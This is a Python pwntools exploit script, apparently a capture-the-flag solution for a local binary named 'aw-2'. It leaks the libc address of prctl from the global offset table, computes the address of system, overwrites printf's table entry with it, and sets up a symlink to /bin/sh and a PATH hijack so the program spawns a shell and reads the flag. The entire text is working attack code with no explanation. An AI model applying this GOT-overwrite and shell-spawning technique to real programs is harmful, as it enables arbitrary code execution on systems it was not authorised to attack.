from pwn import *

GARB = 'bbbbbbbb'

env = {'PATH' : '.:/bin:/usr/bin'}

# Requires a complex symlink
if os.path.exists("Writing"):
    os.remove("Writing")
os.symlink("//bin/sh", "Writing")

if os.path.exists("%lu"):
    os.remove("%lu")
f = open("%lu", "w")
f.write("cat flag")
f.close()

system_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['system']
prctl_init_addr = ELF('/lib/x86_64-linux-gnu/libc.so.6').symbols['prctl']
offset = system_init_addr - prctl_init_addr

# Addresses needed for the attack
got_prctl_addr = 0x602048 # Address of the got entry
got_printf_addr = 0x602028 # Address of the got entry

# Launch processs
p = process('./aw-2', env=env)

# Read 8 bytes
print(p.recvline())
print(p.recvline())
p.sendline('8')

print(p.recvline())
p.sendline(hex(got_prctl_addr))
print(p.recvline())

prctl_addr = p.recv(8)
print(repr(prctl_addr))

prctl_addr = u64(prctl_addr)
print(hex(prctl_addr))

system_addr = prctl_addr + offset
print(hex(system_addr))

print(p.recvline())
print(p.recvline())
p.sendline('8')
print('8')

print(p.recvline())
p.sendline(hex(got_printf_addr))
print(hex(got_printf_addr))

#print(p.recvline())
p.sendline(p64(system_addr))
print(p64(system_addr))

p.interactive()
